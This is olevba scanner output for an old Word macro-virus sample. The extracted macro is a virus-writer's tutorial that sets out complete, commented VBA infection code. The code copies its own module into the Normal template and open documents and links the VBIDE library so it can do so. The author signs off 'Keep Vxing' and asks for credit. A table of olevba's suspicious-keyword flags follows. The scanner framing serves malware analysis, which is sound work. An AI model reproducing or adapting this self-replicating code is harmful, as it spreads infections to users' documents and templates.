olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ami-f1f391aafcbf0ad2391165a657da3fd0bd792e82
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ami-f1f391aafcbf0ad2391165a657da3fd0bd792e82 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul 1.bas 
in file: Virus.MSWord.Intended.Ami-f1f391aafcbf0ad2391165a657da3fd0bd792e82 - OLE stream: 'Macros/VBA/Modul 1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Normal_ As Object, Active_ As Object

> Declare the two object variables we need...

Sub Add_Modul_Infection()
On Error Resume Next

Set Normal_ = NormalTemplate.VBProject
Set Active_ = ActiveDocument.VBProject

> Set the objects...

Const ModulName_ = "A_M_I"

> Set the constant 'ModulName_' to 'A_M_I', coz the name of the module
> won't change...

NormalIns_ = False
ActiveIns_ = False

> Set the install checker both to false...

CheckRefNormal_
CheckRefActive_

> This here is very important. We call the two functions to see if the
> library we need for AMI is already linked. One checks the Template, one
> the document...

NormalComp_ = Normal_.VBComponents.Count
ActiveComp_ = Active_.VBComponents.Count

> Set the value of these to variables to the number of VBComponents in the
> template and the document...

For x = 1 To NormalComp_
    If Normal_.VBComponents(x).Name = ModulName_ Then _
    NormalIns_ = True
Next

> Check here if we are already installed in the template...

For y = 1 To ActiveComp_
    If Active_.VBComponents(y).Name = ModulName_ Then _
    ActiveIns_ = True
Next

> Check if we are already installed in the document...

If NormalIns_ = False Then
  
    VirusLength_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines

> Set the length of the code in the active document module into the
> variable 'VirusLength_'

    VirusCode_ = Active_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)

> Insert the code of the active document module into the string 'VirusCode_'
 
    Normal_.VBComponents.Add (vbext_ct_StdModule)

> Add a module to the template. For this we need the library...

    Normal_.VBComponents((NormalComp_ + 1)).Name = ModulName_

> Change the name of the added module to 'AMI'...

    Normal_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_

> Insert the viruscode into new module...
        
End If

If ActiveIns_ = False Then

> This is the same for the document...

    VirusLength_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.CountOfLines

> Count the length of the virus in the template and set it into the
> integer 'VirusLength_'...

    VirusCode_ = Normal_.VBComponents(ModulName_) _
                    .CodeModule.Lines(1, VirusLength_)

> Insert the template code into the string 'VirusCode_'...
    
    Active_.VBComponents.Add (vbext_ct_StdModule)

> Add the module to the document...

    Active_.VBComponents((ActiveComp_ + 1)).Name = ModulName_

> Change the name of the added module to 'AMI'...

    Active_.VBComponents(ModulName_).CodeModule.AddFromString VirusCode_

> Insert the code into the new module...

End If

End Sub

Function CheckRefNormal_()

> This function checks if the library is alread linked to the template. If
> not it adds it...

CheckRefNormal_ = False

For I = 1 To Normal_.References.Count
    If Normal_.References(I).Name = "VBIDE" Then CheckRefNormal_ = True
Next

> Same as checking for modulenames, but here we check for the library...

If CheckRefNormal_ = False Then
    Normal_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0

> If our needed library isn't linked, then link it with this command...

End If

End Function

Function CheckRefActive_()

> Same as above but for the document...

CheckRefActive_ = False

For I = 1 To Active_.References.Count
    If Active_.References(I).Name = "VBIDE" Then CheckRefActive_ = True
Next

> Check for the library...

If CheckRefActive_ = False Then
    Active_.References _
     .AddFromGuid "{0002E157-0000-0000-C000-000000000046}", 1, 0

> If it's not linked, link it!

End If

End Function

' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'  Jack Twoflower presents: AddModuleInfection
' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

--------------------------------[code ends here]---------------------------

    Hmmm...what do you think about this? I took me really long to find out
how to link a library. If you want to use this technic use it but give me
credits.Thanks!

    If you want to know how to link other libraries, read my article about
it in this issue.

Keep Vxing,                                                  jack twoflower


  <----------\/---------------------------------------------\/---------->

===========================================================================
 (1) The import/export technic was first used by Lord Natas. Thanks
 (2) The 'AddModuleInfection' was first used by jack twoflower

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
<-------------------------\\LineZer0 Network 99//------------------------->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

